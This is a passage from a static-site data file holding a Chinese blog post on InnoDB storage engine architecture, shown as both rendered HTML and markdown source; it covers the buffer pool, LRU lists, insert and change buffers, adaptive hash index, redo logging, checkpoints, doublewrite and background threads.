id=\"后台线程\"><a href=\"#后台线程\" class=\"headerlink\" title=\"后台线程\"></a>后台线程</h2><h3 id=\"1-Master线程\"><a href=\"#1-Master线程\" class=\"headerlink\" title=\"1. Master线程\"></a>1. Master线程</h3><p>负责将重做日志缓冲刷新到重做日志文件</p>\n<h3 id=\"2-IO线程\"><a href=\"#2-IO线程\" class=\"headerlink\" title=\"2. IO线程\"></a>2. IO线程</h3><p>Async IO，分为4种线程</p>\n<ol>\n<li>Read线程（默认4条线程，由<code>innodb_read_io_thread</code>参数控制）</li>\n<li>Write线程（默认4条线程，由<code>innodb_write_io_thread</code>参数控制）</li>\n<li>Insert Buffer线程（1条线程）</li>\n<li>Log线程（1条线程）</li>\n</ol>\n<h3 id=\"3-Purge线程\"><a href=\"#3-Purge线程\" class=\"headerlink\" title=\"3. Purge线程\"></a>3. Purge线程</h3><p>支持设置多个线程，由<code>innodb_purge_threads</code>控制</p>\n<p>负责任务UNDO页回收，<code>innodb_purge_batch_size</code>控制每次回收数量</p>\n<h3 id=\"4-Cleaner线程\"><a href=\"#4-Cleaner线程\" class=\"headerlink\" title=\"4. Cleaner线程\"></a>4. Cleaner线程</h3><p>负责将缓冲池中的脏页刷新到磁盘</p>\n","site":{"data":{}},"excerpt":"","more":"<p>InnoDB存储引擎具有行锁设计、支持事务、支持外键、支持MVCC、支持插入缓冲、支持自适应哈希索引等特点，其整体体系架构主要由后台线程、内存池、文件系统三部分组成，如下图所示：</p>\n<p><img src=\"../static/MB20031501-1.png\" alt=\"图1\"></p>\n<p>接下来会针对后台线程和内存池展开介绍。</p>\n<h2 id=\"内存池\"><a href=\"#内存池\" class=\"headerlink\" title=\"内存池\"></a>内存池</h2><p>内存池从大的方面可以分为三块：重做日志缓冲（redo log buffer）、缓冲池（buffer pool）、额外内存池（additional memery pool）。缓冲池中缓存的数据页类型有：数据页（data page），索引页（index page）、插入缓冲（insert buffer）、锁信息（lock info）、自适应哈希索引（adaptive hash index）、数据字典（data dictionary）、undo页等。缓冲池从1.0.X版本开始，允许有多个实例，根据哈希值将每个页平均分配到不同的实例中。</p>\n<p><img src=\"../static/MB20031501-2.png\" alt=\"图2\"></p>\n<h3 id=\"1-缓冲池\"><a href=\"#1-缓冲池\" class=\"headerlink\" title=\"1. 缓冲池\"></a>1. 缓冲池</h3><p>Innodb是基于磁盘存储的数据库，CPU速度和磁盘速度之间存在巨大的鸿沟，磁盘速度较慢严重降低了数据库系统的性能。基于这个问题，数据库在内存中开辟了一块区域作为缓冲池来弥补两者之间的速度差距。在数据库中读取页时，首先将从磁盘读到的页放在缓冲池中，下次再读相同的页时，首先判断该页是否在缓冲池中，若命中则直接读取该页，否则从磁盘上读取。</p>\n<h4 id=\"LRU列表\"><a href=\"#LRU列表\" class=\"headerlink\" title=\"LRU列表\"></a>LRU列表</h4><p>缓冲池通过LRU（Latest Recent Used，最近使用）算法来进行管理页（数据页、索引页），最频繁使用的排在<code>LRU列表</code>前端，反之，排在末端。当缓冲池不能存放新读取到的页时，首先释放<code>LRU列表</code>末端的页。</p>\n<p>Innodb在LRU算法上做了一些调整。一些的一次性读取大量页的SQL操作会将缓冲池中的页大量刷出，从而影响缓冲池的效率（页缓冲池缓存频繁使用页的初衷不符）。为了解决这个问题，Innodb在LRU算法上引入了midpoint概念，midpoint点将<code>LRU列表</code>一分为二，<code>LRU列表</code>前端至midpoint点为<code>new列表</code>，midpoint点至<code>LRU列表</code>末端为<code>old列表</code>。<code>new列表</code>和<code>old列表</code>各自都以LRU算法管理，新读取的页被加入<code>old列表</code>，只有在<code>old列表</code>中存活一定时间(<code>innodb_old_blocks_time</code>)以后才会被加入<code>new列表</code>，可以看出<code>new列表</code>中的页都是最为活跃的热点数据。midpoint默认值是37%，即默认<code>old列表</code>占完整LRU列表的37%，由参数<code>innodb_old_blocks_pct</code>控制。</p>\n<p><img src=\"../static/MB20031501-3.png\" alt=\"图3\"></p>\n<p><code>LRU列表</code>中存储的页数上限是确定的，Innodb引入了<code>Free列表</code>来与<code>LRU列表</code>共同管理，未分配的页由<code>Free列表</code>进行管理，<code>Free列表</code>当前页数加<code>LRU列表</code>当前页数等于<code>LRU列表</code>可容纳的总页数。新读取页时，首先从<code>Free列表</code>中查找是否有空闲页，若有则将空闲页从<code>Free列表</code>移到<code>LRU列表</code>中，否则根据规则淘汰<code>LRU列表</code>末尾的页。</p>\n<p>InnoDB中页的大小是16KB，InnoDB从1.0.X开始，支持压缩页功能，可以将部分页压缩为1KB、2KB、4KB、8KB，对于非16KB的页，使用<code>unzip_LRU列表</code>管理。如需要申请4KB大小的页时，通过伙伴算法进行分配，过程如下：</p>\n<ol>\n<li>检查4KB的<code>unzip_LRU列表</code>，检查是否有可用空闲页，若有则直接使用</li>\n<li>检查8KB的<code>unzip_LRU列表</code>，若有空闲页，将页分成2个4KB页，存放到4KB的<code>unzip_LRU列表</code></li>\n<li>从<code>LRU列表</code>申请一个16KB的页，将页分成1个8KB的页和2个4KB的页，分别存放到对应的<code>unzip_LRU列表</code>中</li>\n</ol>\n<h4 id=\"脏页\"><a href=\"#脏页\" class=\"headerlink\" title=\"脏页\"></a>脏页</h4><p><code>LRU列表</code>中的页被修改后，该页称为脏页（dirty page），脏页既存在于<code>LRU列表</code>中又存在于<code>Flush列表</code>中，会通过<code>CheckPoint机制</code>被刷新会磁盘。</p>\n<h4 id=\"插入缓冲\"><a href=\"#插入缓冲\" class=\"headerlink\" title=\"插入缓冲\"></a>插入缓冲</h4><p><strong>插入缓冲主要是针对，插入操作时在非唯一的非聚集索引上进行离散插入会导致性能下降，这个问题设计的</strong>。对于聚集索引，与数据的物理存储顺序是一致的，不用担心性能问题，但对于B+树结构下的非聚集索引这是需要考虑的问题。</p>\n<p>这里需要注意的两点是：</p>\n<ol>\n<li>插入缓冲针对的是非聚集索引，不要因为名字就认为针对的是数据页</li>\n<li>插入缓冲管辖的非聚集索引必须是非唯一的索引</li>\n</ol>\n<p>InnoDB存储引擎设计了Insert Buffer（插入缓冲），对于非聚集索引的插入或更新操作，不是每一次直接插入到索引页中，而是先判断插入的非聚集索引页是否在缓冲池中，若在则直接插入，否则先放入到Insert Buffer对象中，好似欺骗。之后主线程会异步地进行合并插入缓冲的工作，这样就大大提高了非聚集索引的插入效率。</p>\n<p>Insert Buffer的数据结构是一棵B+树，在MySQL4.1之前每张表有一棵B+树，而现在版本中全局只有一棵B+树，这棵B+树存放在共享表空间中，默认也就是<code>ibdata1文件</code>中。因此，试图通过独立表空间<code>.ibd文件</code>恢复表中数据时，往往会导致CHECK TABLE失败。这是因为表的辅助索引中的数据可能还在Insert Buffer中，所以通过<code>.ibd文件</code>进行恢复后，还需要进行REPAIR TABLE操作来重建表上所有的辅助索引。</p>\n<p><strong>B+树数据结构</strong></p>\n<p>Insert Buffer B+树非叶子节点存放的是查询的search key，其结构如下所示：space占用4字节，表示插入的表空间的id（InnoDB中每个表都有一个唯一的space id）；marker占用1字节，用于兼容老版本Insert Buffer；page_no占用4字节，表示页所在的偏移量</p>\n<p><img src=\"../static/MB20031501-4.png\" alt=\"图4\"></p>\n<p>Insert Buffer B+树叶子节点的记录，结构如下图所示</p>\n<p><img src=\"../static/MB20031501-5.png\" alt=\"图5\"></p>\n<p>space、marker、page_no字段和非叶子节点中的含义相同，一共9个字节，metadata字段占用4个字节，存储内容如下</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">名称</th>\n<th align=\"center\">字节</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">IBUF_REC_OFFSET_COUNT</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">IBUF_REC_OFFSET_TYPE</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">IBUF_REC_OFFSET_FLAGS</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody></table>\n<p>IBUF_REC_OFFSET_COUNT用来排序每个记录进入Insert Buffer的顺序，因为Innodb从1.0.X开始支持Change Buffer，所以需要这个顺序回放才能得到记录的正确值。</p>\n<blockquote>\n<p>注：</p>\n<ol>\n<li>IBUF_REC_OFFSET_TYPE和IBUF_REC_OFFSET_FLAGS暂时我也没理解清楚，可能与，后面的索引页类型有关</li>\n<li>接下来关于Insert Buffer Bitmap这一块，我也没懂，仅做知识点记录，以后弄明白了再补充</li>\n</ol>\n</blockquote>\n<p>启用Insert Buffer索引后，辅助索引页(space, page_no)中的记录可能被插入到B+树中，为了保证每次Merge Insert Buffer页必须成功，还需要一个特殊的页用来标记每个辅助索引页的可用空间，这个页的类型是Insert Buffer Bitmap。</p>\n<p>每个Insert Buffer Bitmap页用来追踪16384个辅助索引页，即256个区（Extent）（所以一个区是64个页，一个区1MB ）。每个Insert Buffer Bitmap页都在16384个页的第二个页中。每个辅助索引页在Insert Buffer Bitmap页中占用4位(bit)，如下所示：</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>大小(bit)</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>IBUF_BITMAP_FREE</td>\n<td>2</td>\n<td>0 -&gt; 无可用剩余空间<br>1 -&gt; 剩余空间大于1/32页(512字节)<br>2 -&gt; 剩余空间大于1/16页<br>3 -&gt; 剩余空间大于1/8页</td>\n</tr>\n<tr>\n<td>IBUF_BITMAP_BUFFERED</td>\n<td>1</td>\n<td>1表示辅助索引页有记录被缓存在Insert Buffer B+树中</td>\n</tr>\n<tr>\n<td>IBUF_BITMAP_IBUF</td>\n<td>1</td>\n<td>1表示该页位Insert Buffer B+树的索引页</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>注：总结有以下几个没弄明白的点：<br>1.在硬盘上，辅助索引是如何划分页的，如何存储，随着数据的随机新增页的划分不会发生大范围的变化吗<br>2.Insert Buffer B+树叶子节点中的记录具体结构什么样（是单个索引记录还是整页记录）<br>3.Insert Buffer Bitmap在Insert Buffer B+树上吗，如何存在，它追踪16384个页数量的原因</p>\n</blockquote>\n<h4 id=\"Change-Buffer\"><a href=\"#Change-Buffer\" class=\"headerlink\" title=\"Change Buffer\"></a>Change Buffer</h4><p>Change Buffer是InnoDB从1.0.X版本起引入的，可视为Insert Buffer的升级，可以对DML操作——INSERT、DELETE、UPDATE——都进行缓冲，分别是：Insert Buffer、Delete Buffer、Purge Buffer。</p>\n<p>Update操作分为两个步骤：</p>\n<ol>\n<li>将记录标记为已删除——对应Delete Buffer</li>\n<li>真正将记录删除——对应Purge Buffer</li>\n</ol>\n<h4 id=\"UNDO页\"><a href=\"#UNDO页\" class=\"headerlink\" title=\"UNDO页\"></a>UNDO页</h4><p>为了满足事务的原子性，在操作任何数据之前，首先将数据备份到一个地方（这个存储备份的地方称为Undo Log），然后进行数据的修改，这样在rollback时，可以利用Undo Log中备份的undo页将数据恢复到事务开始之前的状态。</p>\n<h4 id=\"自适应哈希索引\"><a href=\"#自适应哈希索引\" class=\"headerlink\" title=\"自适应哈希索引\"></a>自适应哈希索引</h4><p>InnoDB存储引擎会监控对表上各索引页的查询。如果观察到建立哈希索引可以带来速度提升，则建立哈希索引，称之为自适应哈希索引（Adaptive Hash Index, AHI）。AHI是通过缓冲池的B+数页构造而来的，因此建立速度很快，而且不需要对整张表构建哈希索引。InnoDB存储引擎会自动根据访问的频率和模式来自动地为某些热点页建立哈希索引。</p>\n<p>AHI有一个要求，即对这个页的连续访问模式必须是一样的。例如对于（a，b）这样的联合索引，其访问模式可以是以下情况：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WHERE a=xxx</span><br><span class=\"line\">WHERE a=xxx AND b=xxxx</span><br></pre></td></tr></table></figure>\n\n<p>若交替进行上述两种查询，那么不会对该页构造AHI。另外，还有如下要求：</p>\n<ol>\n<li>以该模式访问了100次</li>\n<li>页通过该模式访问了N次，其中N=页中记录/16</li>\n</ol>\n<p>正如一般所知的哈希索引，自适应哈希索引也只能进行等值查询，范围查询是不能使用哈希索引的。</p>\n<p>默认自适应哈希索引是开启的，可以通过<code>innodb_adaptive_hash_index</code>来配置禁用或启动此特性。</p>\n<h3 id=\"2-重做日志缓冲\"><a href=\"#2-重做日志缓冲\" class=\"headerlink\" title=\"2. 重做日志缓冲\"></a>2. 重做日志缓冲</h3><p>重做日志是InnoDB引擎对其本身事务操作的日志记录，记录了关于每个页的更改的物理情况。重做日志的存在能够避免宕机造成数据的丢失。</p>\n<p>在InnoDB中，为了协调CPU与磁盘速度的鸿沟，页的操作首先都是在缓冲池中完成的。重做日志也一样，InnoDB引擎首先将重做日志信息放入到内存中（即重做日志缓冲），然后按一定频率将其刷新到重做日志文件。重做日志缓冲一般不需要设置太大，因为一般情况下每一秒中会将其刷新到重做日志文件，因此只需要保证每秒产生的事务量在这个缓冲大小之内即可（可通过<code>innodb_log_buffer_size</code>控制其大小，默认8MB）。重做日志文件会在三种情况下刷新到重做日志文件：</p>\n<ol>\n<li>主线程每秒刷新一次</li>\n<li>每个事务提交时，会将重做日志缓冲刷新到重做日志文件</li>\n<li>当重做日志缓冲池剩余空间小于1/2时刷新</li>\n</ol>\n<p>当前事务数据库系统普遍采用Write Ahead Log策略，即当事务提交时，先写重做日志，再对页数据进行修改。因此当发生宕机而导致数据丢失时，可通过重做日志完成数据的恢复，当然未刷新到日志文件的重做日志（1秒以内）还是会有所丢失。</p>\n<p><strong>为什么需要重做日志</strong></p>\n<p>如果没有重做日志存在，将数据页刷新到硬盘都将直接操作数据文件，当从缓冲池将页的新版本刷新到硬盘时发生宕机，可能出现部分已写入部分未写入的情况，因为没有重做日志的存在，无法定位哪些页未写入。</p>\n<blockquote>\n<p>注意：重做日志文件的主要作用不是避免宕机造成的数据丢失，而是避免因宕机造成的数据文件的不完整。数据恢复只是不可靠的顺带的功能。BinLog文件才是真正为避免数据丢失而生的。</p>\n</blockquote>\n<h3 id=\"3-额外内存池\"><a href=\"#3-额外内存池\" class=\"headerlink\" title=\"3. 额外内存池\"></a>3. 额外内存池</h3><p>在InnoDB存储引擎中，对内存的管理是通过内存堆的方式进行的。在对数据结构本身的内存进行分配时，需要从额外的内存池中进行申请，当该区域的内存不足时，会从缓冲池中申请。例如，分配了缓冲池，但是每个缓冲池中的帧缓冲还有对应的缓冲控制对象（Buffer Control Block），这些对象记录了一些注入LRU、锁、等待等信息，而这个对象的内存需要从额外内存池中申请。因此，当申请了很大的InnoDB缓冲池时，也应考虑相应地增加这个值。</p>\n<h2 id=\"其他技术与特性\"><a href=\"#其他技术与特性\" class=\"headerlink\" title=\"其他技术与特性\"></a>其他技术与特性</h2><h3 id=\"1-CHECKPOINT技术\"><a href=\"#1-CHECKPOINT技术\" class=\"headerlink\" title=\"1. CHECKPOINT技术\"></a>1. CHECKPOINT技术</h3><p>CheckPoint（检查点）技术与前面说过的重做日志有密切地关系。重做日志是用于防止因宕机导致数据文件损坏，更改记录被刷新到硬盘后，这部分的日志便已经不再需要了，可以被覆盖。因此重做日志文件被设计成可以循环使用的，一般重做日志文件有两个（也可以设置成超过两个文件），循环使用这两个文件。</p>\n<p>要能使用重做日志来恢复数据，必须知道哪些版本数据已经刷入硬盘，哪些版本未刷入硬盘。基于此，就有了检查点（CheckPoint）技术。对于InnnoDB存储引擎而言，其是通过LSN（Log Sequence Number）来标记版本的，LSN是8字节地数字，其单位是字节。每个页有LSN，重做日志中也有LSN，CheckPoint也有LSN，CheckPoint前的数据都已经被刷入硬盘，通过比对CheckPoint的LSN和重做日志中的LSN便能知道哪些版本数据未刷入硬盘。</p>\n<p>在InnoDB中，CheckPoint发生的时间、条件、脏页的选择、刷新脏页的数量都非常复杂。CheckPoint的发生主要有以下几种：</p>\n<ol>\n<li>数据库关闭时，将所有的脏页都刷回硬盘，这是默认都有的（<code>innodb_fast_shutdown=1</code>）</li>\n<li>主线程每1秒、每10秒从缓冲池的列表中刷新一定比例的页回磁盘，这个过程是异步的</li>\n<li>InnoDB引擎需要保证LRU列表中有差不多100个空闲页可供使用，Cleaner线程会检测，如果没有则会将LRU列表尾端的页移除，如果这些页中有脏页（在<code>Flush列表</code>中），则会进行CheckPoint。（InnoDB1.2.X开始LRU可用页的数量默认值为1024，且可通过<code>innodb_lru_scan_depth</code>控制）</li>\n<li>当重做日志文件达到<code>75% * total_redo_log_file_size</code>时（<code>total_redo_log_file_size</code>是所有重做日志文件的总大小），会执行阻塞发现问题的用户查询线程执行Async Flush CheckPoint；当重做日志文件达到<code>90% * total_redo_log_file_size</code>时，会阻塞所有用户查询线程执行Sync Flush CheckPoint。从InnoDB1.2.X开始，在Cleaner线程执行，不会阻塞用户查询线程</li>\n<li>当缓冲池中脏页数量达到<code>innodb_max_dirty_page_pct</code>（默认75%）时，强制执行CheckPoint</li>\n</ol>\n<h3 id=\"2-刷新临接页\"><a href=\"#2-刷新临接页\" class=\"headerlink\" title=\"2. 刷新临接页\"></a>2. 刷新临接页</h3><p>InnoDB还存在了刷新临接页的特性：当刷新一个脏页时，InnoDB存储引擎会检测该页所在区的所有页，如果是脏页，那么一起刷新。可以由参数<code>innodb_flush_neighbors</code>来配置启用或关闭此特性（值0表示关闭）。</p>\n<h3 id=\"3-异步IO\"><a href=\"#3-异步IO\" class=\"headerlink\" title=\"3. 异步IO\"></a>3. 异步IO</h3><p>InnoDB采用异步IO（Asynchronous IO, AIO）的方式来处理磁盘操作，AIO的一个优势是可以对多个索引页进行并发扫描，另一个优势是可以进行IO Merge操作，将多个IO合并为一个IO，例如用户需要访问的页（space, page_no）为（8，6)、（8，7）、（8，8），每个页大小16KB，AIO会判断这三个页是连续的，AIO底层会发送一个IO请求，读取48KB的页。</p>\n<p>在InnoDB1.1.X之前，AIO实现是通过InnoDB引擎代码模拟实现，从InnoDB1.1.X开始，提供了内核级别的AIO支持，称为Native AIO，因此编译或允许该版本MySQL时需要libaio库的支持。Native AIO需要操作系统提供支持，Windows系统和Linux系统都提供Native AIO支持，而Mac OSX系统则未提供，只能依旧使用原模拟的方式。</p>\n<p>可以通过参数<code>innodb_use_native_aio</code>来控制启用Native AIO，Linux系统下默认启用（ON）。</p>\n<h3 id=\"4-两次写\"><a href=\"#4-两次写\" class=\"headerlink\" title=\"4. 两次写\"></a>4. 两次写</h3><p>当数据库宕机时，可能InnoDB正在写入某个页到表中，而这个页只写了一部分，比如16KB的页，只写了前4KB，之后就发生了宕机，这种情况被称为部分写失效。有经验的DBA也许会想如果发生写失效，可以通过重做日志进行恢复。但实际上并不一定可以修复，页内数据有可能本身发生损坏（这与重做日志记录的内容有关，参考<a href=\"https://blog.csdn.net/jolly10/article/details/79791574\" target=\"_blank\" rel=\"noopener\">mysql 为何需要Double Write？有redo log还不够吗？</a>，估计是因为重做日志在页内的记录与最终写入磁盘的并不是完全相同的，还会经过一次与底层结构相关的计算），需要先通过页的副本来还原页，再进行重做，这个副本就就是doublewrite的内容。</p>\n<p>doublewrite由两部分组成，一部分是内存中的doublewrite buffer，大小为2MB，另一部分是物理磁盘上共享表空间中的连续的2个区（128个页，也是2MB）。在对缓冲区进行刷新时，并不直接写磁盘，而是会通过memcpy函数将页先复制到内存中的doublewrite buffer，之后通过doublewrite  buffer再分两次，每次1MB顺序地写入共享表空间的物理磁盘上，然后马上调用fsync函数，同步磁盘，避免缓冲带来的问题。由于doublewrite页是连续的，因此这个过程是顺序写的，开销并不是很大。在完成doublewrite页写入后，再将doublewrie buffer中的页写入各个表空间文件中，此时写入是离散的。</p>\n<p>参数<code>skip_innodb_doublewrite</code>可以禁止使用doublewrite功能，有些情况下，这是需要的，如：用户有多个从服务器（在从服务器上做的是RAID0），可以在从服务器上关闭doublewrite功能；有些文件系统（ZFS文件系统）本身提供了部分写失效的防范机制，就不用开启doublewrite功能。</p>\n<p><img src=\"../static/MB20031501-6.png\" alt=\"图1\"></p>\n<h2 id=\"后台线程\"><a href=\"#后台线程\" class=\"headerlink\" title=\"后台线程\"></a>后台线程</h2><h3 id=\"1-Master线程\"><a href=\"#1-Master线程\" class=\"headerlink\" title=\"1. Master线程\"></a>1. Master线程</h3><p>负责将重做日志缓冲刷新到重做日志文件</p>\n<h3 id=\"2-IO线程\"><a href=\"#2-IO线程\" class=\"headerlink\" title=\"2. IO线程\"></a>2. IO线程</h3><p>Async IO，分为4种线程</p>\n<ol>\n<li>Read线程（默认4条线程，由<code>innodb_read_io_thread</code>参数控制）</li>\n<li>Write线程（默认4条线程，由<code>innodb_write_io_thread</code>参数控制）</li>\n<li>Insert Buffer线程（1条线程）</li>\n<li>Log线程（1条线程）</li>\n</ol>\n<h3 id=\"3-Purge线程\"><a href=\"#3-Purge线程\" class=\"headerlink\" title=\"3. Purge线程\"></a>3. Purge线程</h3><p>支持设置多个线程，由<code>innodb_purge_threads</code>控制</p>\n<p>负责任务UNDO页回收，<code>innodb_purge_batch_size</code>控制每次回收数量</p>\n<h3 id=\"4-Cleaner线程\"><a href=\"#4-Cleaner线程\" class=\"headerlink\" title=\"4. Cleaner线程\"></a>4. Cleaner线程</h3><p>负责将缓冲池中的脏页刷新到磁盘</p>\n"},{"title":"了解InnoDB体系架构","date":"2020-03-15T15:47:19.000Z","keywords":"innodb, buffer","rId":"MB-20031501","_content":"\nInnoDB存储引擎具有行锁设计、支持事务、支持外键、支持MVCC、支持插入缓冲、支持自适应哈希索引等特点，其整体体系架构主要由后台线程、内存池、文件系统三部分组成，如下图所示：\n\n![图1](../static/MB20031501-1.png)\n\n接下来会针对后台线程和内存池展开介绍。\n\n## 内存池\n\n内存池从大的方面可以分为三块：重做日志缓冲（redo log buffer）、缓冲池（buffer pool）、额外内存池（additional memery pool）。缓冲池中缓存的数据页类型有：数据页（data page），索引页（index page）、插入缓冲（insert buffer）、锁信息（lock info）、自适应哈希索引（adaptive hash index）、数据字典（data dictionary）、undo页等。缓冲池从1.0.X版本开始，允许有多个实例，根据哈希值将每个页平均分配到不同的实例中。\n\n![图2](../static/MB20031501-2.png)\n\n### 1. 缓冲池\n\nInnodb是基于磁盘存储的数据库，CPU速度和磁盘速度之间存在巨大的鸿沟，磁盘速度较慢严重降低了数据库系统的性能。基于这个问题，数据库在内存中开辟了一块区域作为缓冲池来弥补两者之间的速度差距。在数据库中读取页时，首先将从磁盘读到的页放在缓冲池中，下次再读相同的页时，首先判断该页是否在缓冲池中，若命中则直接读取该页，否则从磁盘上读取。\n\n#### LRU列表\n\n缓冲池通过LRU（Latest Recent Used，最近使用）算法来进行管理页（数据页、索引页），最频繁使用的排在`LRU列表`前端，反之，排在末端。当缓冲池不能存放新读取到的页时，首先释放`LRU列表`末端的页。\n\nInnodb在LRU算法上做了一些调整。一些的一次性读取大量页的SQL操作会将缓冲池中的页大量刷出，从而影响缓冲池的效率（页缓冲池缓存频繁使用页的初衷不符）。为了解决这个问题，Innodb在LRU算法上引入了midpoint概念，midpoint点将`LRU列表`一分为二，`LRU列表`前端至midpoint点为`new列表`，midpoint点至`LRU列表`末端为`old列表`。`new列表`和`old列表`各自都以LRU算法管理，新读取的页被加入`old列表`，只有在`old列表`中存活一定时间(`innodb_old_blocks_time`)以后才会被加入`new列表`，可以看出`new列表`中的页都是最为活跃的热点数据。midpoint默认值是37%，即默认`old列表`占完整LRU列表的37%，由参数`innodb_old_blocks_pct`控制。\n\n![图3](../static/MB20031501-3.png)\n\n`LRU列表`中存储的页数上限是确定的，Innodb引入了`Free列表`来与`LRU列表`共同管理，未分配的页由`Free列表`进行管理，`Free列表`当前页数加`LRU列表`当前页数等于`LRU列表`可容纳的总页数。新读取页时，首先从`Free列表`中查找是否有空闲页，若有则将空闲页从`Free列表`移到`LRU列表`中，否则根据规则淘汰`LRU列表`末尾的页。\n\nInnoDB中页的大小是16KB，InnoDB从1.0.X开始，支持压缩页功能，可以将部分页压缩为1KB、2KB、4KB、8KB，对于非16KB的页，使用`unzip_LRU列表`管理。如需要申请4KB大小的页时，通过伙伴算法进行分配，过程如下：\n\n1. 检查4KB的`unzip_LRU列表`，检查是否有可用空闲页，若有则直接使用\n2. 检查8KB的`unzip_LRU列表`，若有空闲页，将页分成2个4KB页，存放到4KB的`unzip_LRU列表`\n3. 从`LRU列表`申请一个16KB的页，将页分成1个8KB的页和2个4KB的页，分别存放到对应的`unzip_LRU列表`中\n\n#### 脏页\n\n`LRU列表`中的页被修改后，该页称为脏页（dirty page），脏页既存在于`LRU列表`中又存在于`Flush列表`中，会通过`CheckPoint机制`被刷新会磁盘。\n\n#### 插入缓冲\n\n**插入缓冲主要是针对，插入操作时在非唯一的非聚集索引上进行离散插入会导致性能下降，这个问题设计的**。对于聚集索引，与数据的物理存储顺序是一致的，不用担心性能问题，但对于B+树结构下的非聚集索引这是需要考虑的问题。\n\n这里需要注意的两点是：\n\n1. 插入缓冲针对的是非聚集索引，不要因为名字就认为针对的是数据页\n2. 插入缓冲管辖的非聚集索引必须是非唯一的索引\n\nInnoDB存储引擎设计了Insert Buffer（插入缓冲），对于非聚集索引的插入或更新操作，不是每一次直接插入到索引页中，而是先判断插入的非聚集索引页是否在缓冲池中，若在则直接插入，否则先放入到Insert Buffer对象中，好似欺骗。之后主线程会异步地进行合并插入缓冲的工作，这样就大大提高了非聚集索引的插入效率。\n\nInsert Buffer的数据结构是一棵B+树，在MySQL4.1之前每张表有一棵B+树，而现在版本中全局只有一棵B+树，这棵B+树存放在共享表空间中，默认也就是`ibdata1文件`中。因此，试图通过独立表空间`.ibd文件`恢复表中数据时，往往会导致CHECK TABLE失败。这是因为表的辅助索引中的数据可能还在Insert Buffer中，所以通过`.ibd文件`进行恢复后，还需要进行REPAIR TABLE操作来重建表上所有的辅助索引。\n\n**B+树数据结构**\n\nInsert Buffer B+树非叶子节点存放的是查询的search key，其结构如下所示：space占用4字节，表示插入的表空间的id（InnoDB中每个表都有一个唯一的space id）；marker占用1字节，用于兼容老版本Insert Buffer；page_no占用4字节，表示页所在的偏移量\n\n![图4](../static/MB20031501-4.png)\n\nInsert Buffer B+树叶子节点的记录，结构如下图所示\n\n![图5](../static/MB20031501-5.png)\n\nspace、marker、page_no字段和非叶子节点中的含义相同，一共9个字节，metadata字段占用4个字节，存储内容如下\n\n|   名称   |  字节  |\n| :-----: | :----: |\n| IBUF_REC_OFFSET_COUNT| 2 |\n| IBUF_REC_OFFSET_TYPE | 1 |\n| IBUF_REC_OFFSET_FLAGS| 1 |\n\nIBUF_REC_OFFSET_COUNT用来排序每个记录进入Insert Buffer的顺序，因为Innodb从1.0.X开始支持Change Buffer，所以需要这个顺序回放才能得到记录的正确值。\n\n> 注：\n>\n> 1. IBUF_REC_OFFSET_TYPE和IBUF_REC_OFFSET_FLAGS暂时我也没理解清楚，可能与，后面的索引页类型有关\n> 2. 接下来关于Insert Buffer Bitmap这一块，我也没懂，仅做知识点记录，以后弄明白了再补充\n\n启用Insert Buffer索引后，辅助索引页(space, page_no)中的记录可能被插入到B+树中，为了保证每次Merge Insert Buffer页必须成功，还需要一个特殊的页用来标记每个辅助索引页的可用空间，这个页的类型是Insert Buffer Bitmap。\n\n每个Insert Buffer Bitmap页用来追踪16384个辅助索引页，即256个区（Extent）（所以一个区是64个页，一个区1MB ）。每个Insert Buffer Bitmap页都在16384个页的第二个页中。每个辅助索引页在Insert Buffer Bitmap页中占用4位(bit)，如下所示：\n\n| 名称             | 大小(bit) | 说明                                                         |\n| ---------------- | --------- | ------------------------------------------------------------ |\n| IBUF_BITMAP_FREE | 2         | 0 -> 无可用剩余空间<br />1 -> 剩余空间大于1/32页(512字节)<br />2 -> 剩余空间大于1/16页<br />3 -> 剩余空间大于1/8页 |\n| IBUF_BITMAP_BUFFERED | 1 |1表示辅助索引页有记录被缓存在Insert Buffer B+树中|\n| IBUF_BITMAP_IBUF | 1 |1表示该页位Insert Buffer B+树的索引页|\n>注：总结有以下几个没弄明白的点：\n>1.在硬盘上，辅助索引是如何划分页的，如何存储，随着数据的随机新增页的划分不会发生大范围的变化吗\n>2.Insert Buffer B+树叶子节点中的记录具体结构什么样（是单个索引记录还是整页记录）\n>3.Insert Buffer Bitmap在Insert Buffer B+树上吗，如何存在，它追踪16384个页数量的原因\n\n#### Change Buffer\n\nChange Buffer是InnoDB从1.0.X版本起引入的，可视为Insert Buffer的升级，可以对DML操作——INSERT、DELETE、UPDATE——都进行缓冲，分别是：Insert Buffer、Delete Buffer、Purge Buffer。\n\nUpdate操作分为两个步骤：\n\n1. 将记录标记为已删除——对应Delete Buffer\n2. 真正将记录删除——对应Purge Buffer\n\n#### UNDO页\n\n为了满足事务的原子性，在操作任何数据之前，首先将数据备份到一个地方（这个存储备份的地方称为Undo Log），然后进行数据的修改，这样在rollback时，可以利用Undo Log中备份的undo页将数据恢复到事务开始之前的状态。\n\n#### 自适应哈希索引\n\nInnoDB存储引擎会监控对表上各索引页的查询。如果观察到建立哈希索引可以带来速度提升，则建立哈希索引，称之为自适应哈希索引（Adaptive Hash Index, AHI）。AHI是通过缓冲池的B+数页构造而来的，因此建立速度很快，而且不需要对整张表构建哈希索引。InnoDB存储引擎会自动根据访问的频率和模式来自动地为某些热点页建立哈希索引。\n\nAHI有一个要求，即对这个页的连续访问模式必须是一样的。例如对于（a，b）这样的联合索引，其访问模式可以是以下情况：\n\n```sql\nWHERE a=xxx\nWHERE a=xxx AND b=xxxx\n```\n\n若交替进行上述两种查询，那么不会对该页构造AHI。另外，还有如下要求：\n\n1. 以该模式访问了100次\n2. 页通过该模式访问了N次，其中N=页中记录/16\n\n正如一般所知的哈希索引，自适应哈希索引也只能进行等值查询，范围查询是不能使用哈希索引的。\n\n默认自适应哈希索引是开启的，可以通过`innodb_adaptive_hash_index`来配置禁用或启动此特性。\n\n### 2. 